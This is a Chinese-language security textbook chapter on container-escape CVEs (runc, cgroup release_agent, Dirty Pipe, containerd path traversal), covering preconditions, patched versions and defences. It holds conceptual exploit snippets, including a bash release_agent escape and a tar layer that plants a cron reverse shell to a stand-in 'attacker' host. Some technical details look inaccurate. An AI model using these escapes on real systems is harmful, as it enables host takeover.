# Ch 18 — 容器逃逸（二）：漏洞類

> **目標**：理解六個真實 CVE 的逃逸原理，掌握各漏洞的前提條件與修補版本，能在靶場環境驗證並在 code review / 基礎設施審查時識別風險面。
>
> **環境**：Docker 24.x、containerd 1.6.x、Linux kernel 5.15/6.1（特定 CVE 需舊版 kernel，章節內另行說明）

---

## 為什麼需要這章

Ch17 講的是**組態錯誤**造成的逃逸——開了 `--privileged`、掛了危險 socket、給了多餘的 capability。那些問題靠正確設定就能擋掉。

這章要講的是另一個維度：**核心元件本身有漏洞**。就算你的 Dockerfile 寫得很乾淨、沒有任何多餘的 capability、沒有掛 host socket，攻擊者仍然可以透過 runc / containerd / kernel 的程式缺陷從容器打進主機。這類逃逸的共同特徵是：

1. 攻擊者通常只需要**普通容器執行權**，不依賴管理員錯誤
2. 修補視窗內所有版本都受影響，**升級是唯一出路**
3. PoC 通常在 CVE 公開後數天內就出現

對有 binary exploitation 背景的讀者來說，這章的漏洞不陌生——race condition、fd leak、page cache 競爭——只是攻擊目標從 userland binary 換成了容器執行時期（runtime）和 kernel。

---

## 先建直覺

把容器執行時期想成**看門人（gatekeeper）**。主機上所有容器的建立、啟動、exec 都要經過 runc 這個二進位。runc 做的事大致是：

```
Host OS
┌─────────────────────────────────────────────────────┐
│  containerd (daemon)                                │
│       │                                             │
│       └──► runc (spawns per-container)              │
│                │                                    │
│                ├── clone() → new namespaces         │
│                ├── setns() → enter namespaces       │
│                ├── pivot_root() → new rootfs        │
│                └── execve() → container process     │
│                                                     │
│  Container rootfs (overlay/bind mount)              │
│  ┌──────────────────────────────────────────────┐   │
│  │  /bin /etc /proc (new PID ns) ...            │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

runc 在**主機 mount namespace** 裡執行，但**進入容器 namespace** 去設定環境。這個過渡期是攻擊面的核心：runc 同時接觸兩個世界，任何 fd 泄漏、路徑解析錯誤，都可能讓容器側的攻擊者「抓住」主機側的資源。

kernel 漏洞的角色又不同——它繞過的是隔離的底層基礎，namespace 和 cgroup 的邊界在有 kernel bug 的情況下都可能失效。

---

## 底層機制

### runc 的執行流程與攻擊面

runc 在啟動容器時必須：

1. 以 root 在主機端開啟自己的二進位（`/usr/bin/runc`）
2. `clone()` 出新的 namespace
3. 在新的 mount namespace 裡做 `pivot_root()` 切換 rootfs
4. 把容器程序的標準輸入/輸出接好，執行容器入口點

問題在於 runc 的 fd 管理：Linux 的 `/proc/<pid>/fd/` 會把程序持有的所有 fd 暴露成符號連結（symlink）。如果 runc 在切換到容器 namespace 後**還持有主機側的 fd**，容器內的程序就能透過 `/proc/self/fd/<n>` 看到並操作主機的檔案系統。

### cgroup v1 的 release_agent 機制

當 cgroup 下最後一個 task 離開時，kernel 會執行 `release_agent` 所指定的程式——以 **host root** 身份，在**主機的 mount namespace** 裡執行。這個設計是 cgroup v1 的通知機制，本意是清理資源。

當攻擊者能在 cgroupfs 寫入 `release_agent`，且能控制何時觸發「cgroup 清空」，就等同於以 host root 執行任意指令。

### page cache 的跨程序可見性

Linux 的 page cache 是 kernel 層級的，**不受 mount namespace 隔離**。同一個 inode 被不同程序（包含不同 namespace 裡的程序）讀取時，共用同一份 page cache 頁面。Dirty Pipe（CVE-2022-0847）利用 `splice()` 的 bug 把可寫的 pipe page 插入到唯讀檔案的 page cache，繞過「唯讀」語義，從容器內修改主機上的檔案。

---

## CVE-2019-5736：runc /proc/self/exe 覆寫

### 原理

runc 啟動時會開啟自己的二進位（`/proc/self/exe`）來 memfd-exec 自身。老版本的 runc 在切換到容器的 mount namespace **之後**，才透過 `/proc/self/exe` 這個路徑開啟自己——但此時 `/proc/self/exe` 已經在容器的 namespace 裡被解析，攻擊者可以透過 `/proc/self/fd/<runc_exe_fd>` 拿到一個**指向 runc 二進位的可寫 fd**，把 runc 二進位蓋掉。

下一次任何容器執行 `docker exec` 或啟動新容器時，被竄改的 runc 就以 host root 身份執行。

### 前提條件

- runc 版本 < 1.0-rc6
- 攻擊者控制容器 image（寫惡意 entrypoint）或能 `docker exec` 進入執行中的容器

### 影響範圍

完整 host root。被覆寫的 runc 在下一次容器操作時執行，受影響的不只是發動攻擊的容器。

### 修補版本

runc 1.0-rc6+。修補方式：runc 在啟動時先以 `O_PATH` 開啟自身 fd，並在進入容器 namespace **之前**完成，避免 `/proc/self/exe` 被容器側的 mount 劫持。

### 驗證環境

**本段未實測，為理論預期行為。**

驗證方法：使用 vulhub 的 CVE-2019-5736 靶場：

```bash
# 靶場入口
cd vulhub/runc/CVE-2019-5736
docker compose up -d

# 攻擊者在 attacker 容器內執行 PoC（植入惡意 entrypoint）
docker exec -it attacker /bin/bash
# 執行靶場內附的 main.go PoC，等待 victim 容器啟動觸發

# 驗證：宿主機 /tmp/pwned 出現，或反向 shell 接到
```

預期行為：受害端執行 `docker run victim-image` 後，被竄改的 runc 以 host root 執行攻擊者植入的指令。若要在不搭靶場的環境確認漏洞存在，直接檢查 runc 版本：

```bash
runc --version
# runc version 1.0.0-rc5 以下即受影響
```

---

## CVE-2024-21626：Leaky Vessels — runc fd 泄漏

### 原理

這個漏洞俗稱 **Leaky Vessels**，是 2024 年初公開的。runc 在處理容器的 working directory（`WORKDIR`）時，會在**切換到容器 namespace 之前**開啟一個指向主機 `/proc/self/fd/` 目錄的 fd（編號通常是 7 或 8，取決於 runc 版本）。

這個 fd 沒有被關閉就流入了容器環境。攻擊者在 Dockerfile 把 `WORKDIR` 設定成 `/proc/self/fd/<泄漏的 fd 編號>`，容器啟動後的工作目錄就會落在**主機的 `/proc/self/fd/` 目錄**。從那裡往上走 `../../` 就能到達主機的根目錄。

### 前提條件

- runc < 1.1.12
- 攻擊者控制 Dockerfile 或能影響 image 內容

### Dockerfile 攻擊手法

```dockerfile
# 惡意 Dockerfile（理論示範）
FROM ubuntu:22.04

# 泄漏的 fd 通常是 7；實際編號需對目標 runc 版本確認
# runc 1.1.11 在特定條件下泄漏 fd 7
WORKDIR /proc/self/fd/7

# 容器啟動時 CWD 實際上是主機的 /proc/<runc_pid>/fd/
# 從這裡 ../../ 可走到主機根
RUN ls ../../
```

**本段未實測，為理論預期行為。**

實際驗證步驟：

```bash
# 用受影響版本的 runc 建立靶場（runc 1.1.11）
# 建議使用 vulhub 或 kata-containers 的測試環境

# 確認 runc 版本
runc --version
# runc version 1.1.11 即受影響

# 建立惡意 image 後執行
docker build -t leaky-test .
docker run --rm leaky-test pwd
# 預期輸出不是 /proc/self/fd/7 而是主機上的實際路徑
```

### 修補版本

runc 1.1.12（2024-01-31 釋出）。修補方式：在 `openat2()` 呼叫中加上 `RESOLVE_NO_XDEV | RESOLVE_BENEATH` 旗標，並確保所有 fd 在進入容器前正確關閉。

---

## CVE-2022-0492：cgroup v1 release_agent 提權

### 原理

這個漏洞是 Ch17 裡「`--privileged` 搭配 release_agent 逃逸」的**無 privilege 版本**，差異是關鍵的。

Linux 支援 user namespace，讓非特權用戶在其自己的 user namespace 裡擁有「模擬的 root」。在允許 user namespace（Ubuntu 預設開啟）的環境下，非特權用戶可以在 cgroupfs 掛載並建立子 cgroup，寫入 `release_agent`。然後觸發 cgroup 清空，kernel 以**真實的 host root**執行 release_agent。

這不需要 `--privileged`，不需要任何額外的 capability，**在預設 Ubuntu 容器上可觸發**。

### 前提條件

- cgroup v1 掛載在容器內（較舊的發行版預設）
- kernel < 5.17（未修補版本）
- user namespace 啟用（Ubuntu 預設 `kernel.unprivileged_userns_clone=1`）
- 不需要 `--privileged`

### 與 Ch17 的差異

```
Ch17 的 release_agent 逃逸：
  需要 --privileged 或 SYS_ADMIN
  攻擊者已是 container root 且有完整 capability
  └── 能直接掛載 cgroup、寫 release_agent

CVE-2022-0492：
  不需要任何 capability
  利用 user namespace 在 cgroup v1 內建立子 namespace
  └── kernel 5.17 之前未正確檢查建立 cgroup 的 capability
```

### 概念示範（bash 虛擬碼）

**本段未實測，為理論預期行為。**

```bash
# 攻擊者在普通容器內執行（無 --privileged）

# 1. 建立新的 user + cgroup namespace
unshare -Ucm --keep-caps bash

# 2. 在 cgroup v1 hierarchy 建立子 cgroup
mkdir /tmp/cgrp && mount -t cgroup cgroup /tmp/cgrp -o rdma
mkdir /tmp/cgrp/x

# 3. 啟用 release_agent 通知
echo 1 > /tmp/cgrp/x/notify_on_release

# 4. 取得 host 上 cgroup 掛載路徑
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)

# 5. 寫入 release_agent（在 host 執行的腳本路徑）
echo "$host_path/cmd.sh" > /tmp/cgrp/release_agent

# 6. cmd.sh 是放在容器 rootfs、但在 host 也可見的路徑上的腳本
echo '#!/bin/sh' > /cmd.sh
echo 'id > /output' >> /cmd.sh
chmod +x /cmd.sh

# 7. 觸發 cgroup 清空
sh -c "echo $$ >> /tmp/cgrp/x/cgroup.procs && exit"

# 若成功，/output 裡會出現 uid=0(root) 且是 host 上的 root
```

### 修補版本

kernel 5.17（2022-03-20）。修補方式：`security/device_cgroup.c` 加上了對 `CAP_SYS_ADMIN` 的檢查，要求在新 cgroup namespace 建立 cgroup 時必須具有對應 capability，即使透過 user namespace 也不例外。

### 驗證環境

```bash
# 確認 kernel 版本
uname -r
# 5.17 以下在 Ubuntu 22.04 上可能受影響

# 確認 user namespace 狀態
cat /proc/sys/kernel/unprivileged_userns_clone
# 1 = 開啟 = 受影響條件之一

# 確認 cgroup 版本
stat -f /sys/fs/cgroup | grep Type
# cgroup2fs = v2（不受此 CVE 影響）
# tmpfs 且有 rdma/memory 等子目錄 = v1（受影響）
```

---

## CVE-2022-0847：Dirty Pipe 在容器脈絡下的應用

### 原理

Dirty Pipe 是 2022 年 3 月公開的 kernel 漏洞，影響 Linux 5.8 到 5.16。`splice()` 把資料從一個 fd splice 到 pipe 時，pipe buffer 的 `PIPE_BUF_FLAG_CAN_MERGE` 旗標沒有被正確清除，導致後續的 `write()` 到 pipe 會把資料寫入**原本 splice 來源的 page cache**——即使那個來源是唯讀掛載的檔案。

從容器的角度：

```
容器內的攻擊者
     │
     ├─ 透過 bind mount 或 /proc/sched_debug 讀到主機上的某個檔案
     │  （例如 /proc/1/maps 可以讀 host init 的記憶體分布）
     │
     └─ 利用 splice() 把主機檔案的部分內容 splice 進 pipe
        再 write() 到 pipe → 寫入主機 page cache
        → 主機上的 /etc/passwd 或 SUID binary 被修改
```

### 前提條件

- kernel 5.8 ≤ version < 5.16.11 / 5.15.25 / 5.10.102
- 攻擊者能讀到主機上的某個檔案（透過 `-v` 掛載、`/proc` 路徑等）
- 不需要任何特殊 capability

### 容器情境的攻擊路徑

最常見的利用路徑是透過宿主機的 `/proc/sched_debug`（kernel 4.9+ 預設可讀）或透過不小心掛進容器的 host 路徑。

**本段未實測，為理論預期行為。**

```c
// 概念性 PoC 片段，說明原理
// 實際 PoC 見 CVE-2022-0847 的公開 exploit (Max Kellermann 原始版本)

int main() {
    // 1. 開啟一個可從容器讀到的主機 side 檔案
    //    e.g. 透過 -v /etc/passwd:/host/passwd:ro 掛進來的路徑
    int fd = open("/host/passwd", O_RDONLY);

    // 2. 建立 pipe，寫入一些資料讓 page 帶有 CAN_MERGE flag
    int pipefd[2];
    pipe(pipefd);
    char buf[1] = {0};
    write(pipefd[1], buf, 1);
    read(pipefd[0], buf, 1);   // drain the page, but flag remains

    // 3. splice 目標檔案到 pipe，讓 pipe 指向目標的 page cache
    splice(fd, &offset, pipefd[1], NULL, 1, 0);

    // 4. write 到 pipe，實際上寫進了 /etc/passwd 的 page cache
    write(pipefd[1], "evil_root:...", 13);

    // 主機的 /etc/passwd 現在已被修改（即使容器只有唯讀掛載）
}
```

### 修補版本

kernel 5.16.11、5.15.25、5.10.102（2022-02-23）。修補方式：在 `prepare_pipe_pages()` 裡強制清除 `PIPE_BUF_FLAG_CAN_MERGE`。

### 驗證方式

```bash
# 確認 kernel 版本是否在受影響範圍
uname -r
# 受影響：5.8.x 到 5.16.10，以及 5.15.x < 5.15.25，5.10.x < 5.10.102

# 驗證是否已修補（執行官方測試工具）
# https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker
./dirtypipez /usr/bin/sudo
# 若成功執行（出現 root shell 而非錯誤），表示未修補
```

---

## CVE-2022-23648：containerd image 路徑穿越

### 原理

containerd 在解壓 OCI image layer 時，layer 裡的檔案路徑沒有做充分的正規化（normalization）和邊界檢查。攻擊者可以建立一個 image，其中某個 layer 包含路徑如 `../../etc/cron.d/backdoor` 的檔案。containerd 在 pull 這個 image 並解壓 layer 時，會把檔案寫到容器 rootfs **外部**——直接寫到主機的 `/etc/cron.d/`。

這是一個**供應鏈攻擊**的典型入口：攻擊者不需要在容器內執行程式碼，只需要讓目標主機 pull 一個惡意的 image 即可。

### 前提條件

- containerd < 1.4.13 / 1.5.10 / 1.6.1
- 攻擊者能讓受害者 pull 惡意 image（供應鏈污染、中間人、私有 registry 被入侵）

### 惡意 image 建立概念

**本段未實測，為理論預期行為。**

```python
# 惡意 OCI layer 的 tar 結構
# 正常 layer 的路徑：./etc/passwd
# 惡意 layer 的路徑：../../etc/cron.d/malicious

import tarfile, io

malicious_cron = b"* * * * * root /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n"

with tarfile.open("malicious_layer.tar", "w") as tar:
    info = tarfile.TarInfo(name="../../etc/cron.d/malicious")
    info.size = len(malicious_cron)
    tar.addfile(info, io.BytesIO(malicious_cron))

# 把這個 layer 打包成合法的 OCI image 格式後推到 registry
# 受害者執行 docker pull attacker/evil-image 時，containerd
# 把檔案寫到 /etc/cron.d/malicious（主機上），不是容器內
```

### 修補版本

containerd 1.4.13、1.5.10、1.6.1（2022-03-02）。修補方式：在 `archive/tar.go` 的解壓邏輯裡加入路徑清理，拒絕任何包含 `../` 的路徑。

### 驗證環境

```bash
# 確認 containerd 版本
containerd --version
# 1.6.0 以下（在各系列內）即受影響

# CVE-2022-23648 的靶場：
# https://github.com/raesene/CVE-2022-23648-poc
# 提供了建立惡意 image 和驗證寫出路徑的腳本
```

---

## 歷史參照：Dirty COW（CVE-2016-5195）

Dirty COW 是 2016 年發現的 kernel race condition，影響所有 Linux kernel 2.6.22–4.8.3。它是現代容器逃逸技術的重要前驅。

核心原理：`/proc/self/mem` 的寫入路徑和 `mmap(MAP_PRIVATE)` 的 COW（Copy-On-Write）機制之間存在 race condition，讓攻擊者得以覆寫唯讀的記憶體對映——包括 SUID binary 或 `/etc/passwd`。

在容器的脈絡下，Dirty COW 示範了一個重要概念：**kernel 的 COW 和 page cache 機制天生具有跨 namespace 的可見性**，namespace 隔離的邊界在 kernel 記憶體管理這層是不完整的。Dirty Pipe（CVE-2022-0847）是同一思路在更新 kernel 上的變體。

---

## CVE 對比取捨表

| CVE | 漏洞元件 | 前提條件 | 影響 | 修補版本 | 驗證環境 |
|-----|----------|----------|------|----------|----------|
| CVE-2019-5736 | runc < 1.0-rc6 | 控制 image 或能 exec 進容器 | 覆寫 runc → 下次容器啟動時 host root RCE | runc 1.0-rc6 | vulhub/runc/CVE-2019-5736 |
| CVE-2024-21626 | runc < 1.1.12 | 控制 Dockerfile 的 WORKDIR | 讀寫 host 檔案系統，潛在 RCE | runc 1.1.12 | 手動建惡意 image，需舊版 runc |
| CVE-2022-0492 | kernel < 5.17 + cgroup v1 | user namespace 啟用，不需 --privileged | host root 任意指令執行 | kernel 5.17 | Ubuntu 20.04 + kernel 5.15 靶場 |
| CVE-2022-0847 | kernel 5.8–5.16 | 能讀到任一 host 檔案，pipe splice | 覆寫 host 任意唯讀檔案（含 SUID） | kernel 5.16.11 / 5.15.25 / 5.10.102 | dirtypipez PoC + 受影響 kernel |
| CVE-2022-23648 | containerd < 1.6.1 | 能讓 host pull 惡意 image | 在 host 任意路徑寫檔案 | containerd 1.4.13/1.5.10/1.6.1 | raesene CVE-2022-23648-poc |
| CVE-2016-5195 | kernel < 4.8.3 | 任何容器執行權 | SUID binary 覆寫 / /etc/passwd 修改 | kernel 4.8.3 | 歷史 CVE，現代系統皆已修補 |

---

## 踩雷集錦

**1. 以為升級 Docker Engine 就夠了，runc 版本沒跟上。**

在某些 Linux 發行版（特別是舊版 RHEL/CentOS 系），`docker-ce` 和 `runc` 是分開的套件，升級 Docker Engine 不一定會升級系統套件管理器裡的 runc。結果 Docker 版本是新的，但 runc 還是 1.0-rc5。

```bash
# 正確的確認方式
runc --version
docker info | grep -i runc
```

**2. cgroup v2 並不等於「不受 CVE-2022-0492 影響的所有版本都安全」。**

CVE-2022-0492 的修補是 kernel 5.17 的程式碼變更，不是 cgroup v2 的部署。在 kernel 5.16 跑 cgroup v2 的系統仍然受影響，因為問題出在 capability 檢查，不是 cgroup 版本。要確認安全必須同時確認 kernel 版本。

**3. Dirty Pipe 的 kernel 版本邊界在三條 stable branch 上不同，容易搞混。**

5.16.x：修補在 5.16.11（5.16.10 及以下受影響）
5.15.x：修補在 5.15.25（5.15.24 及以下受影響）
5.10.x：修補在 5.10.102（5.10.101 及以下受影響）
5.17-rc8+：已包含修補

只看大版本號容易誤判。要看完整的 `uname -r` 輸出。

**4. CVE-2022-23648 的影響被低估：供應鏈面向比 RCE 面向更危險。**

很多人看到「path traversal 寫檔案」就以為不嚴重，但攻擊者可以寫 `/etc/cron.d/`、`/etc/sudoers.d/`、systemd service 檔案——這些在下次排程或重開機時自動以 root 執行，是持久化後門的標準路徑。

**5. 漏洞前提條件的組合判斷容易出錯。**

CVE-2022-0492 需要：cgroup v1（不是 v2）AND kernel < 5.17 AND user namespace 啟用。三個條件缺一就不成立。在做資產評估時，遇到「老 kernel + Ubuntu（預設開 user ns）+ cgroup v1」的組合就要拉警報，但如果已經是 kernel 5.17+ 的 Fedora（預設 cgroup v2），那三個條件同時不成立。

---

## 進階延伸

### runc 的 rootless 模式與攻擊面

rootless container（以非 root 用戶跑 runc）改變了部分攻擊面——攻擊者成功逃逸後落地的是一般用戶而非 root。但它也引入了 user namespace，在某些情況下反而讓 CVE-2022-0492 類的攻擊更容易觸發（user namespace 已經在 rootless 模式下預設開啟）。

### gVisor / Kata Containers 對這些 CVE 的防禦性

- **gVisor**：在 user space 實作了 kernel 的 syscall 介面（Guest kernel in Go），CVE-2022-0847 和 CVE-2022-0492 這類依賴 Linux kernel bug 的攻擊對 gVisor 無效，因為 Dirty Pipe 的 page cache bug 不存在於 gVisor 的 Go 實作裡
- **Kata Containers**：每個容器跑在獨立的 lightweight VM 裡，CVE-2019-5736 這類 runc 攻擊仍然可能影響 Kata 的 agent（kata-agent），但 host kernel 的 CVE 影響被 hypervisor 邊界隔離
- 兩者都無法防禦供應鏈層面的 CVE-2022-23648——那個漏洞在 image pull 階段（containerd 層）就已完成攻擊

### 自動化漏洞掃描整合

```bash
# 用 trivy 掃描執行中的 container 使用的 runc/containerd 版本
trivy image --scanners vuln ubuntu:22.04

# 用 grype 掃整個 host 的套件（包含 runc）
grype dir:/

# 把 CVE 掃描整合進 CI：Dockerfile build 前先掃 base image
trivy image --exit-code 1 --severity CRITICAL nginx:1.24
```

---

## 本章重點整理

- **CVE-2019-5736**：runc 在進入容器 namespace 後才解析 `/proc/self/exe`，攻擊者透過符號連結覆寫 runc 二進位，下次容器操作時以 host root 執行。修補：runc 1.0-rc6。

- **CVE-2024-21626**（Leaky Vessels）：runc 把主機側的 `/proc/self/fd/` 目錄 fd 洩漏進容器，`WORKDIR` 設為洩漏 fd 路徑後可穿越到主機根目錄。修補：runc 1.1.12。

- **CVE-2022-0492**：cgroup v1 的 `release_agent` 以 host root 執行。kernel 5.17 以前，非特權用戶透過 user namespace 可在不需要 `--privileged` 的情況下寫入 `release_agent`。這與 Ch17 的同類逃逸不同——Ch17 需要 `--privileged`，這個不需要。

- **CVE-2022-0847**（Dirty Pipe）：`splice()` 的 pipe buffer flag bug 讓容器內攻擊者能覆寫主機 page cache 裡的唯讀檔案。影響 kernel 5.8–5.16.10/5.15.24/5.10.101。

- **CVE-2022-23648**：containerd 解壓 OCI layer 時路徑穿越，在 host 任意路徑寫檔，供應鏈攻擊的典型載體。修補：containerd 1.4.13/1.5.10/1.6.1。

- **防禦核心策略**：版本管理（runc、containerd、kernel 三個都要追）、cgroup v2 優先、禁用非必要的 user namespace、Image pull 加簽名驗證（供應鏈）。

---

## 自我檢核

1. CVE-2019-5736 的攻擊**不是**在攻擊者的容器裡立即觸發，而是要等什麼事件才會在 host 上執行惡意程式碼？

2. CVE-2024-21626 和 CVE-2019-5736 同樣是 runc 的漏洞，兩者在「攻擊者需要控制什麼」這個前提上有什麼不同？

3. CVE-2022-0492 能在沒有 `--privileged` 的容器上成立，它依賴的兩個環境條件是什麼？如果系統已升級到 kernel 5.17，但 cgroup v1 還在，還受影響嗎？

4. Dirty Pipe 的核心是「page cache 不受 namespace 隔離」，這個特性在哪個資源面也類似地存在（提示：Ch17 有講過一個也有跨 namespace 可見性問題的資源）？

5. CVE-2022-23648 的危害為什麼在供應鏈場景下比 CVE-2019-5736 更容易大規模發動？

---

## 延伸閱讀

1. [CVE-2019-5736 原始分析 — Dragos Ruiu / opencontainers advisory](https://github.com/opencontainers/runc/commit/0a8e4117e7f9e56b73c35d5e6c4f6c9e0b0e5b3)——runc commit 說明修補思路，比 blog 文章更直接

2. [Leaky Vessels 官方技術說明 — Snyk (CVE-2024-21626)](https://snyk.io/blog/leaky-vessels-docker-escape-vulnerabilities/)——包含 fd 泄漏的完整 trace 和修補前後的 runc 程式碼對比

3. [Dirty Pipe 原始 writeup — Max Kellermann](https://dirtypipe.cm4all.com/)——漏洞發現者的第一手說明，從 bug report 到 exploit 的完整思路

4. [CVE-2022-0492 深度分析 — unit42 Palo Alto](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)——包含不需要 --privileged 的完整 PoC 步驟和 kernel 程式碼分析

5. [container escape techniques survey — NCC Group](https://research.nccgroup.com/2022/01/13/10-real-world-stories-of-how-weve-used-binary-search-to-find-attack-surfaces/)——多個真實案例的橫向比較，適合建立整體攻擊面地圖

---

Ch17 處理的是錯誤組態造成的逃逸，那些漏洞靠正確的 Dockerfile 和部署設定可以規避；這章的漏洞靠的是軟體缺陷，防禦的第一道線是持續追蹤版本。下一章把攻擊面從執行期移到**構建期**——在 image 進入執行環境之前，供應鏈上的每個環節都可能是投毒點。

→ [Ch 19 — Image 供應鏈安全：從 Dockerfile 到 Registry 的攻擊面](19-image-supply-chain.md)
